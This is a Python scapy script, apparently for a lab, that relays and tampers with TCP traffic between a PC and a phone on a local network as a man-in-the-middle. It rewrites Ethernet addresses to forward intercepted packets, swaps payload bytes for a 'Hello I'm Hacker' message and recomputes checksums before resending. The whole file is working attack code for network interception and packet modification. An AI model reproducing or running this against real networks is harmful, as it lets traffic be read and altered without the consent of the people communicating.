import os
import sys
from tabnanny import verbose

if os.name != 'nt': # IF os is not windows
    sys.path.append('../venv/lib/python3.8/site-packages')


from scapy.all import *
from scapy.layers.l2 import Ether
from scapy.layers.inet import IP, TCP
from scapy.packet import Raw


my_ip = "192.168.33.22"
host = "192.168.33.40" # PC
target = "192.168.33.16" # phone

ip_mac = {
    my_ip: 'a4:6b:b6:08:f2:41',
    host: 'a4:fc:77:26:9e:2f',
    target: 'da:7d:38:5f:cb:52'
}

seq_offset = {
    host: 0,
    target: 0
}

iface_id = 6
iface = None


def get_mac(ip):
    global ip_mac
    if ip in ip_mac:
        return ip_mac[ip]

    ans, _ = arping(ip, verbose=False)
    if ans:
        return ans[0][1][1].hwsrc
    return None


def packet_modify(pkt: Packet):
    assert pkt.haslayer(Raw)

    content = pkt[Raw].load
    content = content.replace( b'system\nsystem_ext\nvendor', b"~~~ Hello I'm Hacker ~~~")
    print( content.find(b'system\nsystem_ext\nvendor'))
    mod_pkt = pkt.copy()
    mod_pkt[Raw].load = content
    return mod_pkt

def process_packet(pkt: Packet):
    # print( packet.layers() )
    global host, target, my_ip, iface

    if pkt.haslayer(Ether) and pkt.haslayer(IP) and pkt.haslayer(TCP):
        dst_ip, dst_mac = pkt[IP].dst, pkt[Ether].dst
        
        if dst_ip != my_ip and dst_mac == get_mac(my_ip):

            if (pkt[IP].src, pkt[IP].dst) == (host, target):
                # host -> target
                pkt[Ether].src = get_mac(my_ip)
                pkt[Ether].dst = get_mac(target)

            elif (pkt[IP].src, pkt[IP].dst) == (target, host):
                # host <- target
                pkt[Ether].src = get_mac(my_ip)
                pkt[Ether].dst = get_mac(host)
            else:
                return
            
            if pkt.haslayer(Raw) and len(pkt[Raw].load) > 1:
                if pkt[IP].src == host:
                    print("[>>]")
                else:
                    print("[<<]")

                # print("  ", pkt.summary())
                print("  ", pkt[Raw].load)
                print()

                pkt = packet_modify(pkt)
                print(pkt[Raw].load)


            # Let sendp to recalculate check sum
            del pkt[IP].chksum
            del pkt[TCP].chksum
            sendp(pkt, iface=iface, verbose=False)




    


if __name__ == "__main__":
    # print(conf.ifaces)
    # iface_id = int( input("wifi interface Index = ") )
    iface = conf.ifaces.dev_from_index(iface_id)
    sniff(iface = iface, prn = process_packet, store=False)

    # sniff(prn = process_packet, store=False)

    ### Packet format experiment.

    # pkt_byte = b'\xa4k\xb6\x08\xf2A\xa4\xfcw&\x9e/\x08\x00E\x00\x004j\xdb@\x00\x80\x06\xcc_\xc0\xa8!(\xc0\xa8!\x10\xc6\\\x15\xb3z\x1e<\xca\x00\x00\x00\x00\x80\x02\xfa\xf0\x1d\x9e\x00\x00\x02\x04\x05\xb4\x01\x03\x03\x08\x01\x01\x04\x02'
    # # mod_byte = b'\xda}8_\xcbR\xa4k\xb6\x08\xf2A\x08\x00E\x00\x004j\xdb@\x00\x80\x06\xcc_\xc0\xa8!\x16\xc0\xa8!\x10\xc6\\\x15\xb3z\x1e<\xca\x00\x00\x00\x00\x80\x02\xfa\xf0\x1d\x9e\x00\x00\x02\x04\x05\xb4\x01\x03\x03\x08\x01\x01\x04\x02'
    # pkt = Ether(pkt_byte)
    # # pkt = Ether(mod_byte)
    # # pkt.show()

    # del pkt[TCP].chksum
    # del pkt[IP].chksum

    # pkt.show2()

